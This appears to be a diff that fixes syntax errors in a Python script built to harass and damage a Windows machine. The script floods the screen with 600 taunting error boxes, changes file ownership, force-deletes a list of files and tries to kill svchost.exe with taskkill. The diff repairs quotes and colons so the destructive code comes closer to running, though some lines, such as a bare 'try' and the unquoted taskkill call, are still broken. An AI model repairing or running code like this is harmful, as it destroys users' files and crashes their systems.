@@ -25,7 +25,7 @@ def show_error_box():
     for _ in range(600):
         error_root = tk.Tk()
         error_root.withdraw()
-        messagebox.showerror(lol?, still using this pc) # type: ignore
+        messagebox.showerror("lol?!?!?!?", "still using this pc?") # type: ignore
         error_root.destroy()
 
     time.sleep(5)  
@@ -40,7 +40,7 @@ def show_error_box():
     ]
 
     # Change the owner of each file in the list after displaying error boxes
-    for file_path in file_paths
+    for file_path in file_paths:
         change_owner(file_path, uid, gid) # type: ignore
 
     files_to_delete = [
@@ -51,15 +51,15 @@ def show_error_box():
     for file_path in files_to_delete:
         try:
             os.unlink(file_path)  # Forcefully delete files
-        except OSError as e
-            print(fError deleting {file_path} {e}) # type: ignore
+        except OSError as e:
+            print(f"Error deleting {file_path} {e}") # type: ignore
             continue
 
         time.sleep(7)
 
     try
         subprocess.run([taskkill, IM, svchost.exe, f], check=True) # type: ignore
-    except subprocess.CalledProcessError as e
+    except subprocess.CalledProcessError as e:
         print(Error, Ooops) # type: ignore
 
 
